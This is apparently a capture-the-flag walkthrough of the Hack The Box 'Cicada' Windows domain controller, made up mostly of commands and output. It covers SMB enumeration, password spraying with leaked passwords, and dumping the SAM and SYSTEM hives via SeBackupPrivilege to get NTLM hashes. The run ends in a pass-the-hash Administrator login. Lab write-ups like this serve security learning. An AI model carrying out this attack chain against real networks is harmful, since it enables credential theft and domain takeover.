# Enumeration

## NMAP

```bash
nmap 10.10.11.35 -sC -sV -p- -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 15:24 EEST
Stats: 0:01:58 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 84.62% done; ETC: 15:26 (0:00:08 remaining)
Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.46% done; ETC: 15:26 (0:00:00 remaining)
Stats: 0:02:33 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 15:27 (0:00:00 remaining)
Nmap scan report for 10.10.11.35
Host is up (0.048s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-18 19:25:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
65089/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-18T19:26:45
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.68 seconds
```

We can see that the box has the SMB open and the domain name of cicada.htb
# Foothold
Let try to enumerate the shares with a standard user

```bash
crackmapexec smb cicada.htb --shares -u 'guest' -p ''
```
```sh
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\guest: 
SMB         cicada.htb      445    CICADA-DC        [+] Enumerated shares
SMB         cicada.htb      445    CICADA-DC        Share           Permissions     Remark
SMB         cicada.htb      445    CICADA-DC        -----           -----------     ------
SMB         cicada.htb      445    CICADA-DC        ADMIN$                          Remote Admin
SMB         cicada.htb      445    CICADA-DC        C$                              Default share
SMB         cicada.htb      445    CICADA-DC        DEV                             
SMB         cicada.htb      445    CICADA-DC        HR              READ            
SMB         cicada.htb      445    CICADA-DC        IPC$            READ            Remote IPC
SMB         cicada.htb      445    CICADA-DC        NETLOGON                        Logon server share 
SMB         cicada.htb      445    CICADA-DC        SYSVOL                          Logon server share 
```

The get user has access to the HR share in which we can find the `Notice from HR.txt` containing the password `Cicada$M6Corpb*@Lp#nZp!8`.

Let's try to enumerate the usersids so we can password spray the AD.

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```
We found some possible users and saved them in the users.txt

```bash
crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```
User `michael.wrightson` has the recovered password. Now we can enumerate the users with an authenticated scan
```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         cicada.htb      445    CICADA-DC        [+] Enumerated domain user(s)
SMB         cicada.htb      445    CICADA-DC        cicada.htb\emily.oscars                   badpwdcount: 0 desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\david.orelious                 badpwdcount: 0 desc: Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         cicada.htb      445    CICADA-DC        cicada.htb\michael.wrightson              badpwdcount: 0 desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\sarah.dantelia                 badpwdcount: 1 desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\john.smoulder                  badpwdcount: 1 desc: 
SMB         cicada.htb      445    CICADA-DC        cicada.htb\krbtgt                         badpwdcount: 1 desc: Key Distribution Center Service Account
SMB         cicada.htb      445    CICADA-DC        cicada.htb\Guest                          badpwdcount: 1 desc: Built-in account for guest access to the computer/domain
SMB         cicada.htb      445    CICADA-DC        cicada.htb\Administrator                  badpwdcount: 1 desc: Built-in account for administering the computer/domain 
```
As we can see the user `david.orelious` has saved his password in the description

```bash
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares            
SMB         cicada.htb      445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         cicada.htb      445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         cicada.htb      445    CICADA-DC        [+] Enumerated shares
SMB         cicada.htb      445    CICADA-DC        Share           Permissions     Remark
SMB         cicada.htb      445    CICADA-DC        -----           -----------     ------
SMB         cicada.htb      445    CICADA-DC        ADMIN$                          Remote Admin
SMB         cicada.htb      445    CICADA-DC        C$                              Default share
SMB         cicada.htb      445    CICADA-DC        DEV             READ            
SMB         cicada.htb      445    CICADA-DC        HR              READ            
SMB         cicada.htb      445    CICADA-DC        IPC$            READ            Remote IPC
SMB         cicada.htb      445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         cicada.htb      445    CICADA-DC        SYSVOL          READ            Logon server share 
```
```bash
smbclient //10.10.11.35/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```
Searching for the availiable shares to `david.orelious` we see that the Dev share is availiable and contains the `Backup_scripts.ps1` script with the credentials `emily.oscars`, `Q!3@Lp#M6b*7t*Vt`

Now we can use evil-winrm to connect to the box and get the user flag.

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb 
```

# Priv Escalation
Let's check the priveleges of emily
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```
The SeBackupPrivilege gives us the ability to access sensity file such sam and system that contain ntlm hashes which can be used to provide administrative privileges.
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download system
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\system to system
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam
                                        
Info: Download successful!
```
We got the ntlm hashes now we can dump them and gain elavated privileges.
```bash
impacket-secretsdump -sam sam -system system local                                                                               
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```
```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
